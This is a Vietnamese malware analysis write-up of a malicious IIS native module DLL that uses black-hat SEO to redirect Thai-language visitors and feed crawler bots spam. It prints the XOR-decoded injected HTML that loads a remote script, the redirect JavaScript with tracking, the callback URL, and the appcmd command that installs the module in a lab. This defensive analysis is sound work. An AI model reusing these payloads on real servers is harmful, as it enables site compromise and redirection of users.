# Phân tích mẫu sha256: 1ab98783a02ad9f127e776c435ef4e24a18ab93c4b4ee5ede722817d4b20771a

## Phân tích tĩnh 

![alt text](img/1.png)

Dùng DIE xác định đây là mẫu file DLL 64 bit. Không có dấu hiệu bị pack, code bằng ngôn ngữ C++.

Mở thử bằng CFF Explorer chúng ta thấy có hàm export là RegisterModule.

![alt text](img/2.png)

Kiểm tra import table chúng ta thấy chương trình có import 
- WINHTTP.dll
- WS2_32.dll
- KERNEL32.dll

Những hàm được import chứng tỏ file này có thể gửi hoặc nhận, kết nối đến các kết nối như http/https.

![alt text](img/3.png)

Hàm này thì có tác dụng chuyển đổi địa chỉ IPv4 hoặc IPv6 về dạng chuỗi.

![alt text](img/4.png)

Cũng có hàm check debug như IsDebuggerPresent

Sử dụng công cụ floss để kiểm tra chuỗi: 

- Có strings iis64.dll và RegisterModule => đây là dấu hiệu dẫn đến đây là một IIS native module (Internet Information Services). IIS Native Module là một thành phần mở rộng của Internet Infomation Services (ISS). Native module tích hợp trực tiếp vào pipeline xử lý yêu cầu của IIS và cho phép can thiệp vào quá trình xử lý http ở mức động. Native module được biên dịch thành DLL và được nạp vào tiến trình IIS (w3wp.exe)
- Các strings liên quan đến các giai đoạn xử lý request như: 
    - HttpModule::OnBeginRequest
    - CHttpModule::OnPostBeginRequest
    - CHttpModule::OnAuthenticateRequest
    - CHttpModule::OnPostAuthenticateRequest
    - CHttpModule::OnAuthorizeRequest
    - CHttpModule::OnPostAuthorizeRequest
    - CHttpModule::OnResolveRequestCache
    - CHttpModule::OnPostResolveRequestCache
    - CHttpModule::OnMapRequestHandler
    - CHttpModule::OnPostMapRequestHandler
    - CHttpModule::OnAcquireRequestState
    - CHttpModule::OnPostAcquireRequestState
    - CHttpModule::OnPreExecuteRequestHandler
    - CHttpModule::OnPostPreExecuteRequestHandler
    - CHttpModule::OnExecuteRequestHandler
    - CHttpModule::OnPostExecuteRequestHandler
    - CHttpModule::OnReleaseRequestState
    - CHttpModule::OnPostReleaseRequestState
    - CHttpModule::OnUpdateRequestCache
    - CHttpModule::OnPostUpdateRequestCache
    - CHttpModule::OnLogRequest
    - CHttpModule::OnPostLogRequest
    - CHttpModule::OnEndRequest
    - CHttpModule::OnPostEndRequest
    - CHttpModule::OnSendResponse
    - CHttpModule::OnMapPath
    - CHttpModule::OnReadEntity
    - CHttpModule::OnCustomRequestNotification
    - CHttpModule::OnAsyncCompletion
- Các strings http/ proxy header 
    - HTTP/1.1    
    - x-forwarded-for: %s 
    - x-real-ip: %s
    - User-Agent
    - Accept-Language
    - Host
    - text/html; charset=utf-8
    - Content-Type
- User-Agent, bot filter
    - Mozilla/5.0 (compatible; SearchEngineModule/1.0)
    - baiduspider của Baidu (Trung Quốc)
    - googlebot của Google
    - sogou của sogou.com (Trung Quốc)
    - 360spider của (Qihoo 360) (Trung Quốc)
- Một loại danh sách các file như kiểu dùng để phân loại hoặc làm filter
    - .png, .jpg, .jpeg, .gif, .webp, .svg, .ico, .bmp, .tiff, .css, .map, .woff, .woff2, .ttf, .eot, .otf, .pdf, .txt, .xml, .json, .csv, .doc, .docx, .xls, .xlsx, .mp4, .mp3, .avi, .mov, .wmv, .flv, .wav, .ogg, .zip, .rar, .tar, .swf, .manifest, .appcache, .webmanifest, .robots, .sitemap

- Một số strings liên quan đến việc phân loại người dùng Thái Lan
    - th-th
    - th;q=
    - th-th;q=
    - th-latn
    - th-th;q=0.8
    - th;q=0.7
    - th-th;q=0.6
    - th;q=0.5

Qua các thông tin sơ bộ, chúng ta có thể thấy đây là một dạng IIS Malware.

Tiến hành phân tích kĩ hơn bằng công cụ IDA. Đầu tiên vào entrypoint RegisterModule để phân tích chúng ta thấy. 

![alt text](img/5.png)

RegisterModule khởi tạo SearchEngineModuleFactory và đăng ký module của DLL với IIS để IIS có thể tạo SearchEngineModule và gọi các handler theo pipeline request.

![alt text](img/6.png)

SearchEngineModuleFactory triển khai hàm tạo module, cấp phát đối tượng SearchEngineModule và trả về cho IIS; IIS dùng instance này để xử lý các notification events đã đăng ký trong RegisterModule.

Tiếp tục phân tích SearchEngineModule.

![alt text](img/7.png)

Chúng ta thấy SearchEngineModule kế thừa từ CHttpModule

![alt text](img/8.png)

Tuy nhiên tại SearchEngineModule đã có hàm sub_1800012C0 là hàm bị ghi đè so với hàm OnBeginRequest bình thường. 

Hàm sub_1800012C0 chính là hàm mã độc.

![alt text](img/9.png)

Đầu tiên thông qua request nó thực hiện trích xuất các thông tin từ request (lấy thông qua hàm GetRequest) nó trả về như:
- Lấy User-Agent qua hàm GetHeader
- Lấy Accept-Language qua hàm GetHeader
- Lấy Host qua hàm GetHeader
- Lấy ScriptName qua GetScriptName
- Lấy IPv4 thông qua GetRemoteAddress

![alt text](img/10.png)

Sau đó nó thực hiện việc lọc xem hiện tại có phải là các tài nguyên tĩnh không, đuôi các file đã được đề cập ở phần trước. Nếu là các file tĩnh thì bỏ qua không tác động.

![alt text](img/11.png)

Sau đó nó thực hiện việc kiểm tra UserAgent để xác định xem là bot crawl hay người dùng thật để chia ra làm 2 hướng xử lý riêng.

![alt text](img/12.png)

Tiếp theo nó xác định nhờ trường Accept Language trong request header để xác định xem có phải người dùng Thái Lan hay không. Nếu không phải người dùng Thái Lan thì không xử lý tiếp. Chứng tỏ mã độc này target đến người dùng Thái Lan.

![alt text](img/13.png)

![alt text](img/14.png)

Tiếp theo nó tiến hành giải mã payload, dữ liệu cụ thể là key xor ở đây là xmmword_180019FF0 xmmword 7A7A7A7A7A7A7A7A7A7A7A7A7A7A7A7Ah và xor với 0x7A.

Sau khi giải mã đầy đủ chúng ta sẽ có được thông tin như sau


```
<!DOCTYPE html><  464416170E125A3F2A232E39353E5B46 xor 7A7A7A7A7A7A7A7A7A7A7A7A7A7A7A7A
html><head><meta 1B0E1F1746441E1B1F12464416170E12 xor 7A7A7A7A7A7A7A7A7A7A7A7A7A7A7A7A
></head><body><s 094644031E151846441E1B1F12554644 xor 7A7A7A7A7A7A7A7A7A7A7A7A7A7A7A7A
cript src=" 58471908095A0E0A130819 xor 7A
 charset="UTF-8" 5842573C2E2F58470E1F09081B12195A xor 7A7A7A7A7A7A7A7A7A7A7A7A7A7A7A7A
//tz.jmfwy.com/j 105517151954030D1C171054000E5555 xor 7A7A7A7A7A7A7A7A7A7A7A7A7A7A7A7A
ump/tiger.js 0F170A550E131D1F08541009 xor 7A
y></html> 03444655120E171644 xor 7A
"></script></bod 1E15185546440E0A1308190955464458 xor 7A7A7A7A7A7A7A7A7A7A7A7A7A7A7A7A
```
Thu được mã html hợp lệ là 

```html
<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><script src="//tz.jmfwy.com/jump/tiger.js"></script></body></html>
```
![alt text](img/15.png)

Sau đó nó thực hiện việc lấy response trả lại và ghi lại. Hành vi nó sẽ là inject script redirect/JS. Khi truy cập đến file js kia chúng ta thấy được logic. 

![alt text](img/16.png)

```JS
<script src="//sdk.51.la/js-sdk-pro.min.js" charset="UTF-8" id="LA_COLLECT"></script>
<script>
  // Khởi tạo tracking 51.la (nếu SDK đã load và có biến LA)
  LA.init({ id: "Ku3qK9PwS091KYzH", ck: "Ku3qK9PwS091KYzH" });
  // Random số trong [0, 1)
  var randomNum = Math.random();
  // 10% redirect sang site A, 90% sang site B
  if (randomNum < 0.1) {
    window.location.href = "https://ufa9f.vip";
  } else {
    window.location.href = "https://ufa99mk.com/?referCode=484486956338&inviteType=CUSTOM";
  }
</script>
```

Nó thực hiện cơ chế theo dõi và chuyển hướng trang web ("tài chính :))"). Ở đây mã độc sử dụng dịch vụ https://51[.]la/ để thống kê người dùng bị chuyển hướng.

Như vậy là xong nhánh đầu tiên khi không phải bot và người dùng Thái Lan.

Tiếp theo là hướng khi là các con bot crawl web. Mục đích của mã độc là tăng lượt truy cập và cải thiện SEO.

![alt text](img/17.png)

![alt text](img/18.png)

Ở đây nó thực hiện chuyển đổi Host từ ANSI -> WCHAR. Sau đó chuyển đổi phần ScriptName hay Path sang dạng kiểu UrlEncode.

![alt text](img/19.png)

Tiếp đó nó tiếp tục ghép thành url. Ở đây nó giải mã bằng việc xor với 0x7A và 7A007A007A007A007A007A007A007A. 

```
http://4 12000E000E000A004000550055004E00 xor 7A007A007A007A007A007A007A007A00
04.imxzq 4A004E00540013001700020000000B00 xor 7A007A007A007A007A007A007A007A00
.com/tdk 540019001500170055000E001E001100 xor 7A007A007A007A007A007A007A007A00
s.php?do 090054000A0012000A0045001E001500 xor 7A007A007A007A007A007A007A007A00
main=%s& 17001B001300140047005F0009005C00 xor 7A007A007A007A007A007A007A007A00
path=%s 0A001B000E00120047005F000900 xor 7A007A007A007A007A007A007A00
```

Ghép lại url đầy đủ sẽ là ```http://404.imxzq.com/tdks.php?domain=%s&path=%s```với nó lấy hai giá trị ở chỗ % s là domain (Host) và path (scriptName). Mục đích ở đây có lẽ để tracking xem con nào đã bị nhiễm, và đường dẫn hiện tại.

![alt text](img/20.png)

Sau đó nó tiếp tục việc fentch data tiếp với url được tính toán từ trước. 

![alt text](img/21.png)

Hành vi của nó là thực hiện việc tạo phiên WinHTTP. Và thực hiện dùng WinHttpCrackUrl để lấy host / port / path / scheme (http/https). Rồi thực hiện việc kết nối đến bằng WinHttpConnect. 

![alt text](img/22.png)

Nó thực hiện OpenRequest GET và thêm 2 trường header là x-forwarded-for và x-real-ip và với giá trị là clientIP.

![alt text](img/23.png)

Tiếp đó nó bỏ qua hay bypass sll, chứng chỉ xác thực. Rồi gửi request đi rồi trả ra dữ liệu. Rồi ghi ra. Vậy mục đích của nó là tăng lượt truy cập website. Và những con bot sẽ crawl phải các dữ liệu bẩn, để tăng SEO và lượt truy cập cho những web tài chính. 

![alt text](img/24.png)

Điều này giúp các web tài chính dễ lên top công cụ tìm kiếm khi người dùng tìm kiếm. Ví dụ như thế này mà người chủ trang web có thể không biết khi đã bị lây nhiễm.

![alt text](img/25.png)

## Phân tích động

![alt text](img/26.png)

Setup với Windows Server 2019, Website cơ bản và dịch vụ IIS như hình.

Tiến hành việc đăng kí dịch vụ với file dll bằng câu lệnh 

```%windir%\system32\inetsrv\appcmd.exe install module /name:SearchEngineModule /image:"C:\lab\iis64.dll"```

![alt text](img/27.png)

Đăng kí dịch vụ thành công. Reset dịch vụ IIS lại bằng iisreset.

![alt text](img/28.png)

DLL đã được đăng kí thành công.

Khi mở lại web thì vẫn thấy nội dung bình thường. 

![alt text](img/29.png)

![alt text](img/30.png)

Đơn giản, chúng ta thử đổi người ngôn ngữ Chrome sang Thái Lan thử. Lúc này Accept-Language của chúng ta sẽ thành th. 

![alt text](img/31.png)

Chạy lại web sẽ thấy nội dung tài chính. 

![alt text](img/32.png) 

Vậy là người dùng đã bị chuyển tiếp thành công đến web tài chính.

Sử dụng công cụ đổi User-Agent thành googlebot thử chúng ta sẽ thấy được nội dung tài chính 2 mà bot crawl sẽ gặp phải.

![alt text](img/34.png)

![alt text](img/35.png)

Có rất nhiều link để tăng SEO.

![alt text](img/36.png)

Sử dụng Burpsuite và thấy được nội dung như chúng ta đã giải mã ở phần phân tích tĩnh như trước.

```html
<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><script src="//tz.jmfwy.com/jump/tiger.js"></script></body></html>
```

Nội dung đối với bot

![alt text](img/37.png)

![alt text](img/38.png)

Chọn remove để gỡ mã độc.

![alt text](img/39.png)

Gỡ thành công.

## Tài liệu tham khảo 

[+] https://github.com/nhat3eo22/SEO_Malware

[+] https://github.com/microsoft/IIS.Common

[+] https://blog.viettelcybersecurity.com/phat-hien-chien-dich-tan-cong-moi-cua-nhom-apt-vao-cac-may-chu-iis-su-dung-ma-doc-iis-raid/

[+] https://sec.vnpt.vn/2024/05/part-1-hacker-thuc-hien-black-hat-seo-cac-trang-web-bat-hop-phap-bang-tan-cong-redirect-nhu-the-nao/

[+] https://sec.vnpt.vn/2024/09/part-2-hacker-thuc-hien-black-hat-seo-cac-trang-web-bat-hop-phap-bang-tan-cong-redirect-nhu-the-nao

[+] https://whitehat.vn/threads/ma-doc-iis-hung-thu-tan-cong-vao-cac-trang-web-co-quan-nha-nuoc-gan-day.16474/